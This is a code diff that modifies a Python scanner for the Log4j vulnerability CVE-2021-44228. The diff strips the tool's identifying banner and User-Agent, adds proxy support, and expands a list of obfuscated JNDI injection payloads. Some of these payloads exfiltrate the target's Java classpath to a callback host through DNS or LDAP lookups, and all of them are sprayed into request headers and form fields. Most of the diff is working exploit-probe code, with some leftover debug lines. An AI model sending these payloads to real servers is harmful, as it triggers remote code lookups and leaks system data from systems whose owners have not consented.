@@ -9,7 +9,10 @@
 # ******************************************************************
 
 import argparse
+import hashlib
 import random
+from os import getpid
+
 import requests
 import time
 import sys
@@ -23,9 +26,8 @@ from Crypto.Cipher import AES, PKCS1_OAEP
 from Crypto.PublicKey import RSA
 from Crypto.Hash import SHA256
 from termcolor import cprint
-import datetime
 
-PID = str(int(datetime.datetime.now().timestamp()))
+
 # Disable SSL warnings
 try:
     import requests.packages.urllib3
@@ -33,10 +35,10 @@ try:
 except Exception:
     pass
 
+from os import getpid
 
-cprint('[•] CVE-2021-44228 - Apache Log4j RCE Scanner', "green")
-cprint('[•] Scanner provided by FullHunt.io - The Next-Gen Attack Surface Management Platform.', "yellow")
-cprint('[•] Secure your External Attack Surface with FullHunt.io.', "yellow")
+
+PID = getpid()
 
 if len(sys.argv) <= 1:
     print('\n%s -h for help.' % (sys.argv[0]))
@@ -44,25 +46,49 @@ if len(sys.argv) <= 1:
 
 
 default_headers = {
-    'User-Agent': 'log4j-scan (https://github.com/mazen160/log4j-scan)',
-    # 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36',
     'Accept': '*/*'  # not being tested to allow passing through checks on Accept header in older web-servers
 }
-post_data_parameters = ["username", "user", "email", "email_address", "password"]
+post_data_parameters = {
+    'PTusnm': "username",
+    'PTusr': "user",
+    'PTeml': "email",
+    'PTemla': "email_address",
+    'PTpswd': "password",
+}
 timeout = 4
-waf_bypass_payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{callback_host}}/{{random}}}",
-                       "${${::-j}ndi:rmi://{{callback_host}}/{{random}}}",
-                       "${jndi:rmi://{{callback_host}}}",
-                       "${${lower:jndi}:${lower:rmi}://{{callback_Host}}/{{random}}}",
-                       "${${lower:${lower:jndi}}:${lower:rmi}://{{callback_host/{{random}}}",
-                       "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{{callback_host}}/{{random}}}",
-                       "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{callback_host}}/{{random}}}",
-                       "${jndi:dns://{{callback_host}}}"]
+
+waf_bypass_payloads = {
+  "plA": "${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}/{{random}}}",
+  "plB": "${${::-j}ndi:rmi://{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}/{{random}}}",
+  "plC": "${jndi:rmi://{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}",
+  "plD": "${${lower:jndi}:${lower:rmi}://{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}/{{random}}}",
+  "plE": "${${lower:${lower:jndi}}:${lower:rmi}://{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}/{{random}}}",
+  "plF": "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}/{{random}}}",
+  "plG": "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}/{{random}}}",
+  "plH": "${jndi:dns://{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}",
+  "pl0": "${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}",
+  "pl1": "${${::-j}ndi:rmi://{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}",
+  "pl2": "${jndi:rmi://{{verb}}.${sys:java.class.path}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}",
+  "pl3": "${${lower:jndi}:${lower:rmi}://{{verb}}.${sys:java.class.path}{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}",
+  "pl4": "${${lower:${lower:jndi}}:${lower:rmi}://{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}",
+  "pl5": "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}",
+  "pl6": "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}",
+  "pl7": "${jndi:dns://${sys:java.class.path}{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}",
+  "pl8": "${jndi:dns://${sys:java.class.path}{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}",
+  "pl9": "${jndi:dns://${sys:java.class.path}{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}",
+  "pl10": "${jndi:dns://${sys:java.class.path}{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}",
+  "pl11": "${jndi:dns://${sys:java.class.path}{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}",
+}
 
 parser = argparse.ArgumentParser()
 parser.add_argument("-u", "--url",
                     dest="url",
                     help="Check a single URL.",
+                    action='store')
+parser.add_argument("-p", "--proxy",
+                    dest="proxy",
+                    help="send requests through proxy",
                     action='store')
 parser.add_argument("-l", "--list",
                     dest="usedlist",
@@ -109,33 +135,52 @@ parser.add_argument("--custom-dns-callback-host",
 args = parser.parse_args()
 
 
+proxies = {}
+if args.proxy:
+    proxies = {"http": args.proxy, "https": args.proxy}
+
+
+def strip_template(value, keys):
+    for key in keys:
+        value = value.replace('{{' + key + '}}.', '')
+    return value
+
+
 def get_fuzzing_headers(payload):
+    # payload = payload.replace('')
     fuzzing_headers = {}
     fuzzing_headers.update(default_headers)
+    header_hashmap = {}
     with open(args.headers_file, "r") as f:
         for i in f.readlines():
             i = i.strip()
             if i == "" or i.startswith("#"):
                 continue
-            fuzzing_headers.update({i: payload})
-    if args.exclude_user_agent_fuzzing:
-        fuzzing_headers["User-Agent"] = default_headers["User-Agent"]
-
-    fuzzing_headers["Referer"] = f'https://{fuzzing_headers["Referer"]}'
+            hash_id = hash_string(i, 6, prefix='hdr')
+            fuzzing_headers.update({i: strip_template(payload.replace('{{header_id}}', hash_id), keys=['var', 'pvar'])})
+            header_hashmap[hash_id] = i
+    # with open('header_hashmap-%d.json' % getpid(), mode='w') as fd:
+    #    json.dump(header_hashmap, fd)
+    # if args.exclude_user_agent_fuzzing:
+    #    fuzzing_headers["User-Agent"] = default_headers["User-Agent"]
+    # fuzzing_headers["Referer"] = f'https://{fuzzing_headers["Referer"]}'
+    print(json.dumps(fuzzing_headers, indent=2))
     return fuzzing_headers
 
 
 def get_fuzzing_post_data(payload):
     fuzzing_post_data = {}
-    for i in post_data_parameters:
-        fuzzing_post_data.update({i: payload})
+    for k, v in post_data_parameters.items():
+        fuzzing_post_data[v] = payload.replace('{{pvar}}', k).replace('{{verb}}.', '').replace('{{header_id}}.', '').replace('{{var}}.', '')
+
     return fuzzing_post_data
 
 
 def generate_waf_bypass_payloads(callback_host, random_string):
     payloads = []
-    for i in waf_bypass_payloads:
-        new_payload = i.replace("{{callback_host}}", callback_host)
+    for pd, pv in waf_bypass_payloads.items():
+        # pd is the payload label/description
+        new_payload = pv.replace("{{callback_host}}", pd + '.' + callback_host)
         new_payload = new_payload.replace("{{random}}", random_string)
         payloads.append(new_payload)
     return payloads
@@ -174,7 +219,6 @@ class Interactsh:
         self.correlation_id = self.domain[:20]
 
         self.session = requests.session()
-        self.session.verify = False
         self.session.headers = self.headers
         self.register()
 
@@ -227,13 +271,13 @@ def parse_url(url):
     url = url.replace('#', '%23')
     url = url.replace(' ', '%20')
 
-    if ('://' not in url):
+    if '://' not in url:
         url = str("http://") + str(url)
     scheme = urlparse.urlparse(url).scheme
 
     # FilePath: /login.jsp
     file_path = urlparse.urlparse(url).path
-    if (file_path == ''):
+    if file_path == '':
         file_path = '/'
 
     return({"scheme": scheme,
@@ -242,48 +286,127 @@ def parse_url(url):
             "file_path": file_path})
 
 
+def hash_string(value, n=8, prefix=None):
+    """Hash a value, truncate it at n chars"""
+    m = hashlib.sha256()
+    value = value.encode('utf-8')
+    m.update(value)
+    value = m.hexdigest()[:n]
+    return value if prefix is None else prefix + value
+
+
+def strip_url(v):
+    return v.replace('{{header_id}}.', '').replace('{{pvar}}.', '')
+
+
+def strip_post_data(data):
+    for k, v in data.items():
+        data[k] = v.replace('{{header_id}}.', '')
+    return data
+
+
+def wrap_request(*args, **kwargs):
+    try:
+        if 'url' in kwargs:
+            kwargs['url'] = kwargs['url'].replace('{{header_id}}.', '').replace('{{pvar}}.', '')
+        if 'params' in kwargs:
+            for k, v in kwargs['params'].items():
+                kwargs['params'][k] = v.replace('{{header_id}}.', '').replace('{{pvar}}.', '')
+        if 'data' in kwargs:
+            for k, v in kwargs['data'].items():
+                kwargs['data'][k] = v.replace('{{header_id}}.', '').replace('{{var}}.', '')
+    except Exception as err:
+        raise
+    requests.request(*args, **kwargs)
+
+
+def strip_header(value):
+    return value.replace('{{var}}.', '').replace('{{pvar}}.', '')
+
+
 def scan_url(url, callback_host):
     parsed_url = parse_url(url)
-    random_string = ''.join(random.choice('0123456789abcdefghijklmnopqrstuvwxyz') for i in range(7))
-    payload = '${jndi:ldap://%s.%s/%s}' % (parsed_url["host"], callback_host, random_string)
+    random_string = ''.join(random.choice('0123456789abcdefghijklmnopqrstuvwxyz') for i in range(3))
+    # payload = '${jndi:ldap://%s.{{verb}}.%s/%s}' % (parsed_url["host"], callback_host, random_string)
+#    payload = '${jndi:ldap://%s.{{verb}}.{{var}}.{{pvar}}.{{header_id}}.%s/%s}' % (parsed_url["host"], callback_host, random_string)
+    payload = '${jndi:ldap://${sys:java.class.path}.%s.{{verb}}.{{var}}.{{pvar}}.{{header_id}}.%s/%s}' % (parsed_url["host"], callback_host, random_string)
+
+
     payloads = [payload]
+
     if args.waf_bypass_payloads:
         payloads.extend(generate_waf_bypass_payloads(f'{parsed_url["host"]}.{callback_host}', random_string))
     for payload in payloads:
         cprint(f"[•] URL: {url} | PAYLOAD: {payload}", "cyan")
         if args.request_type.upper() == "GET" or args.run_all_tests:
             try:
-                requests.request(url=url,
-                                 method="GET",
-                                 params={"v": payload},
-                                 headers=get_fuzzing_headers(payload),
-                                 verify=False,
-                                 timeout=timeout)
+                tagged_payload = payload.replace('{{verb}}', 'vGT')
+                wrap_request(
+                    url=url,
+                    method="GET",
+                    params={},
+                    # params={"v": tagged_payload},
+                    headers=get_fuzzing_headers(tagged_payload),
+                    verify=False,
+                    timeout=timeout,
+                    proxies=proxies)
+                # requests.request(url=url,
+                #                  method="GET",
+                #                  params={"v": tagged_payload},
+                #                  headers=get_fuzzing_headers(tagged_payload),
+                #                  verify=False,
+                #                  timeout=timeout,
+                #                  proxies=proxies)
             except Exception as e:
+                print('yo')
                 cprint(f"EXCEPTION: {e}")
 
         if args.request_type.upper() == "POST" or args.run_all_tests:
             try:
                 # Post body
-                requests.request(url=url,
-                                 method="POST",
-                                 params={"v": payload},
-                                 headers=get_fuzzing_headers(payload),
-                                 data=get_fuzzing_post_data(payload),
-                                 verify=False,
-                                 timeout=timeout)
+                tagged_payload = payload.replace('{{verb}}', 'vPT')
+                wrap_request(
+                    url=url,
+                    method="POST",
+                    # params={"v": tagged_payload},
+                    params={},
+                    headers=get_fuzzing_headers(tagged_payload),
+                    data=get_fuzzing_post_data(tagged_payload),
+                    verify=False,
+                    timeout=timeout,
+                    proxies=proxies)
+                # requests.request(url=url,
+                #                  method="POST",
+                #                  params={"v": tagged_payload},
+                #                  headers=get_fuzzing_headers(tagged_payload),
+                #                  data=get_fuzzing_post_data(tagged_payload),
+                #                  verify=False,
+                #                  timeout=timeout,
+                #                  proxies=proxies)
             except Exception as e:
                 cprint(f"EXCEPTION: {e}")
 
             try:
                 # JSON body
-                requests.request(url=url,
-                                 method="POST",
-                                 params={"v": payload},
-                                 headers=get_fuzzing_headers(payload),
-                                 json=get_fuzzing_post_data(payload),
-                                 verify=False,
-                                 timeout=timeout)
+                tagged_payload = payload.replace('{{verb}}', 'vPJ')
+                wrap_request(
+                    url=url,
+                    method="POST",
+                    # params={"v": tagged_payload},
+                    params={},
+                    headers=get_fuzzing_headers(tagged_payload),
+                    json=get_fuzzing_post_data(tagged_payload),
+                    verify=False,
+                    timeout=timeout,
+                    proxies=proxies)
+                # requests.request(url=url,
+                #                  method="POST",
+                #                  params={"v": tagged_payload},
+                #                  headers=get_fuzzing_headers(tagged_payload),
+                #                  json=get_fuzzing_post_data(tagged_payload),
+                #                  verify=False,
+                #                  timeout=timeout,
+                #                  proxies=proxies)
             except Exception as e:
                 cprint(f"EXCEPTION: {e}")
 
@@ -303,7 +426,7 @@ def main():
     dns_callback_host = ""
     if args.custom_dns_callback_host:
         cprint(f"[•] Using custom DNS Callback host [{args.custom_dns_callback_host}]. No verification will be done after sending fuzz requests.")
-        dns_callback_host =  f'p{PID}{args.custom_dns_callback_host}'
+        dns_callback_host = f'p{PID}.{args.custom_dns_callback_host}'
     else:
         cprint(f"[•] Initiating DNS callback server ({args.dns_callback_provider}).")
         if args.dns_callback_provider == "interact.sh":
